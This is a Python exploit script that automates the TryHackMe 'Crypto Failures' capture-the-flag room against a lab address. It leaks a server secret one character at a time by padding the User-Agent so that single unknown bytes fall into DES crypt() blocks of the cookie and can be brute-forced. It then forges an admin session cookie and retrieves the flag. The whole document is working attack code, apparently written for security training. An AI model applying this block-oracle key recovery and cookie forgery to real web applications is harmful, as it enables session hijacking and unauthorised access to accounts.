import string
import requests
import crypt
from urllib import unquote

url = "http://10.10.15.174"
user = "admin"
agent = "x"

def getCookie(agent):
   req = requests.session()
   headers = {"User-Agent": agent}
   response = req.get(url, headers=headers)
   cookies = req.cookies.get_dict()
   cookie = unquote(cookies["secure_cookie"]).decode("utf-8")

   return cookie

def getKey():
   alph = string.printable
   secret = ""

   for i in range(1,155):
      user = "guest"
      pad = 1

      while True:
         agent = "x" * pad
         attempt = secret + "*" + "-" * (154 - i)
         text = user + ":" + agent + ":" + attempt

         if ((text.find("*") + 1) % 8 == 0):
            original_cookie = getCookie(agent)
            salt = original_cookie[0:2]

            j = text.find("*")
            chunk = text[j-7: j]

            for c in alph:
               attempt = chunk + c
               hashed_chunk = crypt.crypt(attempt, salt)
               if hashed_chunk in original_cookie:
                  secret += c
                  break
            break

         pad += 1

   print("*" * 20)
   print("Key:" + secret)

   return secret

def genCookie(user,key):
   salt = "ab"
   agent = "x"
   text = user + ":x:" + key
   cookie = ""

   for i in range(0, len(text), 8):
      el = text[i:i+8]
      cookie += crypt.crypt(el, salt)

   print("*" * 20)
   print("Generating the cookie ...")
   print("User-Agent: " + agent)
   print("Cookie: secure_cookie=" + cookie + "; user=" + user)

   return cookie

def getFlag(cookie):
   cookies = {"secure_cookie":cookie,"user":user}
   headers = {"User-Agent":agent}
   resp = requests.get(url, headers = headers, cookies = cookies)

   print("*" * 20)
   print("Getting the flag content ...")
   print(resp.text)
   print("*" * 20)

def main():
   print("Automating the exploitation of room 'Crypto Failures' :)")
   print("https://tryhackme.com/room/cryptofailures")
   print("Getting the key ...")
   key = getKey()
   cookie = genCookie(user,key)
   getFlag(cookie)

main()
